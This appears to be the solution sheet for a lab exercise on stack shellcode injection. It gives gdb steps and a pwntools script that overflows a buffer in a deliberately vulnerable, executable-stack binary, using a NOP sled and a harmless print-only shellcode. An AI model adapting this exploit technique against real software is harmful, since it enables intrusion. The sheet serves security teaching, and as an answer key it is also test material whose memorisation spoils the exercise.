Solution — Exercise 02: Shellcode Injection
=============================================

Step 1: Get the buffer address
  gdb ./target
  break vulnerable
  run
  p &buffer
  → e.g. 0x7fffffffe020

Step 2: Write the exploit (using pwntools)
  from pwn import *
  context.arch = 'amd64'

  # Shellcode: write(1, "[SUCCESS]\n", 10)
  sc = asm(shellcraft.write(1, '[SUCCESS]\n', 10))

  buf_addr = 0x7fffffffe020  # your address from gdb

  nop_sled  = b'\x90' * 32
  shellcode = sc
  padding   = b'A' * (64 + 8 - len(nop_sled) - len(shellcode))
  ret_addr  = struct.pack('<Q', buf_addr + 16)  # aim into the NOP sled

  payload = nop_sled + shellcode + padding + ret_addr

  with open('payload', 'wb') as f:
      f.write(payload)

  Then: ./target < payload

Step 3: Run it
  python3 exploit.py && ./target < payload

Why it works:
  With -z execstack, memory on the stack is executable.
  We overflow the return address to point back into our buffer,
  where the CPU begins executing our shellcode directly.
